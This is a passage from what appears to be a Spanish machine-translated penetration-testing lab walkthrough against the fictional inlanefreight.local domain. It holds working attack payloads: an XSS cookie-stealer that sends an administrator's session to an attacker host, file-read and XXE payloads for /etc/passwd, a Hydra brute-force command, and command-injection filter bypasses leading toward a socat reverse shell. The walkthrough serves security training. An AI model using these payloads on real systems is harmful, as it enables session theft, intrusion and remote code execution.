Continuando, navegamos por el`http://support.inlanefreight.local`Sitio y vea que es un portal de soporte de TI. Los portales de boletos de soporte pueden permitirnos involucrarnos con un usuario en vivo y, a veces, puede llevar a un ataque del lado del cliente donde podemos secuestrar una sesión de usuario a través de un`Cross-Site Scripting (XSS)`vulnerabilidad. Navegando alrededor de la aplicación, encontramos el`/ticket.php`Página donde podemos recaudar un boleto de soporte. Veamos si podemos activar algún tipo de interacción del usuario. Complete todos los detalles de un boleto e incluya lo siguiente en el`Message`campo:

Código:javascript

```javascript
 "><script src=http://10.10.14.15:9000/TESTING_THIS</script>
```

Cambie la IP por su cuenta y comience un`Netcat`oyente en el puerto 9000 (o cualquier puerto que desee). Haga clic en el`Send`Botón y revise a su oyente una devolución de llamada para confirmar la vulnerabilidad.

  Enumeración y explotación web

```shell-session
xnoxos@htb[/htb]$ nc -lvnp 9000

listening on [any] 9000 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.203.101] 56202
GET /TESTING_THIS%3C/script HTTP/1.1
Host: 10.10.14.15:9000
Connection: keep-alive
User-Agent: HTBXSS/1.0
Accept: */*
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

Este es un ejemplo de un ataque de secuencias de comandos de sitios cruzados ciegos (XSS). Podemos revisar los métodos para la detección de XSS ciegos en el[Scripting de sitios cruzados (XSS)](https://academy.hackthebox.com/module/103/section/1008)módulo.

Ahora necesitamos descubrir cómo podemos robar la cookie de un administrador para que podamos iniciar sesión y ver qué tipo de acceso podemos obtener. Podemos hacer esto creando los siguientes dos archivos:

1. índice.php

Código:php

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

2. script.js

Código:javascript

```javascript
new Image().src='http://10.10.14.15:9200/index.php?c='+document.cookie
```

A continuación, inicie un servidor web PHP en su host de ataque de la siguiente manera:

  Enumeración y explotación web

```shell-session
sudo php -S 0.0.0.0:9200
```

Finalmente, cree un nuevo boleto y envíe lo siguiente en el campo de mensaje:

Código:javascript

```javascript
"><script src=http://10.10.14.15:9200/script.js></script>
```

Recibimos una devolución de llamada en nuestro servidor web con la cookie de sesión de un administrador:

  Enumeración y explotación web

```shell-session
xnoxos@htb[/htb]$ sudo php -S 0.0.0.0:9200

[Tue Jun 21 00:33:27 2022] PHP 7.4.28 Development Server (http://0.0.0.0:9200) started
[Tue Jun 21 00:33:42 2022] 10.129.203.101:40102 Accepted
[Tue Jun 21 00:33:42 2022] 10.129.203.101:40102 [200]: (null) /script.js
[Tue Jun 21 00:33:42 2022] 10.129.203.101:40102 Closing
[Tue Jun 21 00:33:43 2022] 10.129.203.101:40104 Accepted
[Tue Jun 21 00:33:43 2022] 10.129.203.101:40104 [500]: GET /index.php?c=session=fcfaf93ab169bc943b92109f0a845d99

<SNIP>
```

A continuación, podemos usar un complemento de Firefox como[Editor de galletas](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search)iniciar sesión usando la cookie de sesión del administrador.

![text](https://academy.hackthebox.com/storage/modules/163/edit_cookie.png)

Haga clic en el botón Guardar para guardar la cookie llamada`session`y haga clic en`Login`en la parte superior derecha. Si todo está funcionando como se esperaba, seremos redirigidos a`http://support.inlanefreight.local/dashboard.php`. Tómese un tiempo y registre otro hallazgo más`Cross-Site Scripting (XSS)`, señalando que el hallazgo es de alto riesgo porque se puede usar para robar la sesión de un administrador activo y acceder al sistema de cola de boletos. Consultar el[Scripting de sitios cruzados (XSS)](https://academy.hackthebox.com/module/details/103)Módulo para una actualización en XSS y las diversas formas en que se puede aprovechar esta clase de vulnerabilidades, incluido el secuestro de sesiones.

---

## rastreing.inlaneFreight.local

El sitio en`http://tracking.inlanefreight.local/`nos permite ingresar un número de seguimiento y recibir un PDF que muestra el estado de nuestro pedido. La aplicación toma la entrada del usuario y genera un documento PDF. Tras la generación de pdf, podemos ver que el`Tracking #:`el campo toma cualquier entrada (no solo números) que especificamos en el cuadro de búsqueda antes de presionar el`Track Now`botón. Si insertamos una carga útil simple de JavaScript, como`<script>document.write('TESTING THIS')</script>`y hacer clic`Track Now`, vemos que se genera el PDF y el mensaje`TESTING THIS`se representa, lo que parece significar que el código JavaScript se está ejecutando cuando el servidor web genera el documento.

![text](https://academy.hackthebox.com/storage/modules/163/tracking_rendered.png)

Notamos que también podemos inyectar HTML. Una carga útil simple como`<h1>test</h1>`Renderizará en el`Tracking #:`Campo sobre la generación de PDF también. Busca en Google algo como`pdf HTML injection vulnerability`Devuelve varios éxitos interesantes como[esta publicación](https://blog.appsecco.com/finding-ssrf-via-html-injection-inside-a-pdf-file-on-aws-ec2-214cc5ec5d90)y[esta publicación](https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f)Discutir aprovechar la inyección HTML, XSS y SSRF para leer el archivo local. Ahora, aunque no está cubierto en el`Penetration Tester Job Role Path`, es importante tener en cuenta que a menudo nos encontraremos con cosas nuevas durante nuestras evaluaciones.

---

## Lidiar con lo inesperado

Aquí es donde la mentalidad del probador de penetración es clave. Debemos poder adaptarnos, empujar y producir, y tomar la información que encontramos y aplicar nuestro proceso de pensamiento para determinar qué está sucediendo. Después de un poco de sondeo, pudimos deducir que la aplicación web genera informes PDF, y podemos controlar la entrada a un campo que solo debería aceptar números, como parece. A través de un poco de investigación, pudimos identificar una clase de vulnerabilidad con la que aún no estamos familiarizados, pero hay una considerable investigación y documentación. Muchos investigadores publican una investigación extremadamente detallada de sus propias evaluaciones o recompensas de errores, y a menudo podemos usar esto como una guía para tratar de encontrar problemas similares. No hay dos evaluaciones iguales, pero solo hay muchas posibles pilas de tecnología de aplicaciones web, por lo que estamos obligados a ver ciertas cosas una y otra vez, y pronto las cosas que fueron nuevas y difíciles se convirtieron en una segunda naturaleza. Vale la pena revisar el[Ataques del lado del servidor](https://academy.hackthebox.com/module/145/section/1297)Módulo para obtener más información sobre SSRF y otros ataques del lado del servidor.

Cavemos en algunos de estos escritos y veamos si podemos producir un resultado similar y obtener lectura de archivos locales. Siguiendo esto[correo](https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f), probemos para leer el archivo local usando[Objetos xmlhttprequest (xhr)](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest)y también consultar esto[Excelente publicación](https://web.archive.org/web/20221207162417/https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/)En el archivo local lee a través de XSS en PDF generados dinámicamente. Podemos usar esta carga útil para probar el archivo leído, primero intentando el`/etc/passwd`Archivo, que es legible por el mundo y debe confirmar la existencia de la vulnerabilidad.

Código:javascript

```javascript
	<script>
	x=new XMLHttpRequest;
	x.onload=function(){  
	document.write(this.responseText)};
	x.open("GET","file:///etc/passwd");
	x.send();
	</script>
```

Pegamos la carga útil en el cuadro de búsqueda y presionamos el`Track Now`El botón y el PDF recientemente generado nos muestra el contenido del archivo, ¡así que tenemos lectura de archivo local!

![text](https://academy.hackthebox.com/storage/modules/163/ssrf_file_read.png)

Vale la pena leer estas publicaciones de blog, estudiar este hallazgo y su impacto, y familiarizarse con esta clase de vulnerabilidad. Si tuviéramos que encontrar algo como esto durante una prueba de penetración con la que no estamos familiarizados pero que parecían "apagados", podríamos referirnos al[Proceso de prueba de penetración](https://academy.hackthebox.com/module/90/section/939)Para realizar un análisis de la situación. Si hiciéramos nuestra investigación y aún no pudiéramos descubrir la vulnerabilidad, debemos tener notas detalladas de lo que hemos probado y nuestro proceso de pensamiento y pedirle ayuda a nuestros compañeros y a más miembros de nuestro equipo. Los equipos de Pentest a menudo tienen personas que se especializan o son más fuertes en ciertas áreas, por lo que es probable que alguien en el equipo haya visto esto o algo similar.

Juega con esta vulnerabilidad un poco más y vea a qué más puedes acceder. Por ahora, anotaremos otro hallazgo de alto riesgo,`SSRF to Local File Read`, y sigue adelante.

---

## vpn.inlaneFreight.local

Es común encontrar VPN y otros portales de acceso remoto durante un compromiso de prueba de penetración. Esto parece ser un portal de inicio de sesión Fortinet SSL VPN. Durante las pruebas, confirmamos que la versión en uso no era vulnerable a ninguna hazaña conocida. Este podría ser un excelente candidato para la pulverización de contraseñas en un compromiso del mundo real, siempre que adoptemos un enfoque cuidadoso y medido para evitar el bloqueo de cuentas.

Intentamos algunos pares de credenciales comunes/débiles, pero recibimos el siguiente mensaje de error:`Access denied.`, por lo que podemos pasar de aquí a la próxima aplicación.

---

## gitlab.inlaneFreight.local

Muchas compañías organizan sus propias instancias de Gitlab y, a veces, no las bloquean correctamente. Como cubierto en el[Gitlab - Discovery & Enumeration](https://academy.hackthebox.com/module/113/section/1216)Sección de la`Attacking Common Applications`Módulo, hay varios pasos que un administrador puede implementar para limitar el acceso a una instancia de GitLab, como:

- Requerir la aprobación del administrador para nuevos registros
- Listas configuradas de dominios permitidos para sus registros
- Configuración de una lista de NEGY

Ocasionalmente nos encontraremos con una instancia de Gitlab que no está adecuadamente asegurada. Si podemos acceder a una instancia de GitLab, vale la pena cavar para ver qué tipo de datos podemos encontrar. Podemos descubrir archivos de configuración que contienen contraseñas, claves SSH u otra información que podría conducir a promover nuestro acceso. Después de registrarse, podemos navegar a`/explore`Para ver a qué proyectos, si los hay, tenemos acceso. Podemos ver que podemos acceder al`shopdev2.inlanefreight.local`Proyecto, que nos da una pista a otro subdominio que no descubrimos usando la transferencia de la zona DNS y probablemente no pudimos encontrar el uso del subdominio bruto.

![text](https://academy.hackthebox.com/storage/modules/163/gitlab_explore.png)

Antes de explorar el nuevo subdominio, podemos registrar otro hallazgo de alto riesgo:`Misconfigured GitLab Instance`.

---

## shopdev2.inlaneFreight.local

Nuestra enumeración de la instancia de gitlab condujo a otro vhost, así que primero agrégalos a nuestro`/etc/hosts`archivo para que podamos acceder a él. Navegar por`http://shopdev2.inlanefreight.local`, somos redirigidos a un`/login.php`página de inicio de sesión. Las derivaciones de autenticación típicas no nos llevan a ningún lado, por lo que volvemos a los conceptos básicos por el`Attacking Common Applications`módulo[Descubrimiento y enumeración de la aplicación](https://academy.hackthebox.com/module/113/section/1088)Sección e prueba algunos pares de credenciales débiles. A veces son las cosas más simples que funcionan (y sí, vemos este tipo de cosas en producción, tanto internas como externos) y podemos iniciar sesión con`admin:admin`. Una vez iniciado sesión, vemos algún tipo de tienda en línea para comprar productos mayoristas. Cuando vemos`dev`En una URL (especialmente orientada externa), podemos suponer que no está listo para la producción y vale la pena cavar, especialmente debido al comentario`Checkout Process not Implemented`cerca de la parte inferior de la página.

Podemos probar la búsqueda de vulnerabilidades de inyección y buscar idors y otros defectos, pero no encontrar nada particularmente interesante. Probemos el flujo de compras, centrándonos en el proceso de pago del carrito de compras y capturemos las solicitudes en Burp Suite. Agregue un artículo o dos al carrito y busque`/cart.php`y haga clic en el`I AGREE`Botón para que podamos analizar la solicitud en Burp. Mirando a Burp, vemos que un`POST`la solicitud se realiza con`XML`en el cuerpo así:

Código:xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
    <root>
     <subtotal>
      undefined
     </subtotal>
     <userid>
      1206
     </userid>
    </root>
```

Piense en el contenido del módulo, a saber, el[Ataques web](https://academy.hackthebox.com/module/134/section/1203)módulo; Esto parece un buen candidato para`XML External Entity (XXE) Injection`Porque el formulario parece estar enviando datos al servidor en formato XML. Intentamos algunas cargas útiles y finalmente podemos lograr la lectura del archivo local para ver el contenido del`/etc/passwd`Archivo con esta carga útil:

Código:xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE userid [
  <!ENTITY xxetest SYSTEM "file:///etc/passwd">
]>
<root>
	<subtotal>
		undefined
	</subtotal>
	<userid>
		&xxetest;
	</userid>
</root>
```

![text](https://academy.hackthebox.com/storage/modules/163/xxe_passwd.png)

Analicemos otro hallazgo de alto riesgo,`XML External Entity (XXE) Injection`(¡Tenemos bastante la lista hasta ahora!), Y pasamos al último Vhost/subdominio.

---

## monitoreo.inlaneFreight.local

Descubrimos el`monitoring`Vhost antes, por lo que no repetiremos el proceso. Utilizamos FFUF, pero esta enumeración también se puede realizar con otras herramientas. Prueba con`GoBuster`para sentirse cómodo con más herramientas. Navegar por`http://monitoring.inlanefreight.local`resulta en una redirección a`/login.php`. Podemos probar algunas cargas útiles de derivación de autenticación y pares de credenciales débiles comunes, pero no llegar a ninguna parte, solo recibiendo el`Invalid Credentials!`Error cada vez. Dado que este es un formulario de inicio de sesión, vale la pena explorar más para que podamos confundirlo un poco con el intruso de eructos para ver si podemos provocar un mensaje de error indicativo de una vulnerabilidad de inyección SQL, pero no tenemos éxito.

Un análisis de la solicitud y la respuesta en la suite BURP no produce nada interesante. En este punto, hemos agotado casi todos los ataques web posibles y hemos vuelto al contenido del módulo, recordando el[Iniciar forcedura de bruto](https://academy.hackthebox.com/module/57/section/503)módulo que se centra en la herramienta`hydra`. Esta herramienta se puede usar para los formularios de inicio de sesión HTTP de fuerza bruta, así que vamos a intentarlo. Usaremos lo mismo[lista de palabras](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top100.txt)desde`SecLists`Repo de Github como antes.

Configuraremos`hydra`para realizar el ataque con forcedura bruta, especificando el`Invalid Credentials!`Mensaje de error para filtrar intentos de inicio de sesión no válidos. Recibimos un éxito para el par de credenciales`admin:12qwaszx`, una contraseña común de "caminata de teclado" que es fácil de recordar pero que puede ser muy fácilmente forzada/agrietada.

  Enumeración y explotación web

```shell-session
xnoxos@htb[/htb]$ hydra -l admin -P ./passwords.txt monitoring.inlanefreight.local http-post-form "/login.php:username=admin&password=^PASS^:Invalid Credentials!"

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-21 11:32:17
[DATA] max 16 tasks per 1 server, overall 16 tasks, 99 login tries (l:1/p:99), ~7 tries per task
[DATA] attacking http-post-form://monitoring.inlanefreight.local:80/login.php:username=admin&password=^PASS^:Invalid Credentials!
[80][http-post-form] host: monitoring.inlanefreight.local   login: admin   password: 12qwaszx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-21 11:32:22
```

Una vez iniciado sesión, se nos presenta algún tipo de consola de monitoreo. Si escribimos`help`, se nos presenta una lista de comandos. Esto parece un entorno de shell restringido para realizar tareas limitadas y algo muy peligroso que no debe expuestos externamente. La última clase de vulnerabilidades enseñadas en el`Penetration Tester Job Role Path`que aún no hemos cubierto es[Inyecciones de comando](https://academy.hackthebox.com/module/details/109).

![text](https://academy.hackthebox.com/storage/modules/163/monitoring.png)

Caminamos a través de cada uno de los comandos. Intentando`cat /etc/passwd`no funciona, por lo que parece que estamos en un entorno restringido.`whoami`y`date`Proporcionarnos información básica. No queremos`reboot`el objetivo y causar una interrupción del servicio. No podemos poder`cd`a otros directorios. Mecanografía`ls`Nos muestra algunos archivos que probablemente se almacenan en el directorio a los que actualmente estamos restringidos.

![text](https://academy.hackthebox.com/storage/modules/163/monitoring_files.png)

Mirando a través de los archivos, encontramos un servicio de autenticación y también que estamos dentro de un contenedor. La última opción en la lista es`connection_test`. Escribir eso en el rendimiento de un`Success`mensaje y nada más. Volviendo a Burp Suite y proxyendo la solicitud, vemos que un`GET`la solicitud se realiza a`/ping.php`para la IP localhost`127.0.0.1`, y la respuesta HTTP muestra un solo ataque de ping exitoso. Podemos inferir que el`/ping.php`script está ejecutando un comando operativo utilizando una función PHP como`shell_exec(ping -c 1 127.0.0.1)`o tal vez similar usando el[sistema()](https://www.php.net/manual/en/function.system.php)función para ejecutar un comando. Si este script se codifica de manera incorrecta, podría dar como resultado una vulnerabilidad de inyección de comando, así que intentemos algunas cargas útiles comunes.

Parece haber algún tipo de filtrado en su lugar porque probar cargas útiles estándar como`GET /ping.php?ip=%127.0.0.1;id`y`GET /ping.php?ip=%127.0.0.1|id`resultar en un`Invalid input`Error, lo que significa que probablemente haya una lista negra de personaje en el juego. Podemos omitir este filtro usando un carácter de alimentación de línea`%0A`(o carácter de nueva línea) como nuestro operador de inyección siguiendo la metodología discutida en el[Pasando por alto los filtros espaciales](https://academy.hackthebox.com/module/109/section/1036)sección. Podemos hacer una solicitud que agrega el personaje de nueva línea como So So So`GET /ping.php?ip=127.0.0.1%0a`, y el ping todavía es exitoso, lo que significa que el personaje no está en la lista negra.

Hemos ganado la primera batalla, pero parece haber otro tipo de filtro en su lugar, como intentar algo como`GET /ping.php?ip=127.0.0.1%0aid`todavía da como resultado un`Invalid input`error. A continuación, podemos jugar con la sintaxis del comando y ver que podemos evitar el segundo filtro usando citas individuales. Cambiar a`cURL`, podemos ejecutar el`id`Comando de la siguiente manera:

  Enumeración y explotación web

```shell-session
xnoxos@htb[/htb]$ curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'd"

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.045 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.045/0.045/0.045/0.000 ms
uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
```

Hemos logrado la ejecución de comandos como el`webdev`usuario. Cavando un poco más, vemos que este host tiene múltiples direcciones IP, una de las cuales lo coloca dentro del`172.16.8.0/23`Red que era parte del alcance inicial. Si podemos obtener acceso estable a este host, podemos girar en la red interna y comenzar a atacar el dominio Active Directory.

  Enumeración y explotación web

```shell-session
xnoxos@htb[/htb]$ curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'fconfig"

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.048 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.048/0.048/0.048/0.000 ms

<SNIP>

ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.203.101  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:feb9:67a5  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:67a5  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:67:a5  txqueuelen 1000  (Ethernet)
        RX packets 10055  bytes 1041358 (1.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2316  bytes 4030180 (4.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.8.120  netmask 255.255.254.0  broadcast 172.16.255.255
        inet6 fe80::250:56ff:feb9:a62d  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:a6:2d  txqueuelen 1000  (Ethernet)
        RX packets 21515  bytes 1890242 (1.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 15  bytes 1146 (1.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Nuestro próximo desafío es encontrar un camino hacia una capa inversa. Podemos ejecutar comandos únicos, pero cualquier cosa con un espacio no funciona. De vuelta al[Pasando por alto los filtros espaciales](https://academy.hackthebox.com/module/109/section/1036)Sección de la`Command Injections`Módulo, recordamos que podemos usar el`($IFS) Linux Environment Variable`para evitar restricciones de espacio. Podemos combinar esto con el bypass de carácter de nueva línea y comenzar a enumerando formas de obtener una carcasa inversa. Para ayudarnos, echemos un vistazo al`ping.php`Archivo para comprender lo que se está filtrando para que podamos limitar la cantidad de conjeturas necesarias.

Volver a Burp y hacer la solicitud`GET /ping.php?ip=127.0.0.1%0a'c'at${IFS}ping.php`, o similares, nos da el contenido del archivo, y podemos trabajar para superar el filtro y encontrar una manera de establecer un shell inverso.

Código:php

```php
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
$output = '';

function filter($str)
{
  $operators = ['&', '|', ';', '\\', '/', ' '];
  foreach ($operators as $operator) {
    if (strpos($str, $operator)) {
      return true;
    }
  }
  $words = ['whoami', 'echo', 'rm', 'mv', 'cp', 'id', 'curl', 'wget', 'cd', 'sudo', 'mkdir', 'man', 'history', 'ln', 'grep', 'pwd', 'file', 'find', 'kill', 'ps', 'uname', 'hostname', 'date', 'uptime', 'lsof', 'ifconfig', 'ipconfig', 'ip', 'tail', 'netstat', 'tar', 'apt', 'ssh', 'scp', 'less', 'more', 'awk', 'head', 'sed', 'nc', 'netcat'];
  foreach ($words as $word) {
    if (strpos($str, $word) !== false) {
      return true;
    }
  }

  return false;
}

if (isset($_GET['ip'])) {
  $ip = $_GET['ip'];
  if (filter($ip)) {
    $output = "Invalid input";
  } else {
    $cmd = "bash -c 'ping -c 1 " . $ip . "'";
    $output = shell_exec($cmd);
  }
}
?>
<?php
echo $output;
?>
```

Podemos ver que la mayoría de las opciones para obtener una carcasa inversa se filtran, lo que dificulta las cosas, sin embargo, una que no lo es.`socat`. Socat es una herramienta versátil que se puede usar para captar conchas e incluso girar como hemos visto en el[Pivote, túneles y reenvío de puertos](https://academy.hackthebox.com/module/details/158)módulo. Veamos y veamos si está disponible para nosotros en el sistema. Volver a Burp y usar la solicitud`GET /ping.php?ip=127.0.0.1%0a'w'h'i'ch${IFS}socat`nos muestra que está en el sistema, ubicado en`/usr/bin/socat`.

![text](https://academy.hackthebox.com/storage/modules/163/socat_check.png)

---

## Siguientes pasos

Ahora que finalmente hemos trabajado a través de todos los servicios y aplicaciones web orientadas externamente, tenemos una buena idea sobre nuestros próximos pasos. En la siguiente sección, trabajaremos para establecer un caparazón inversa en el entorno interno y aumentar nuestros privilegios para establecer algún tipo de persistencia en el host objetivo.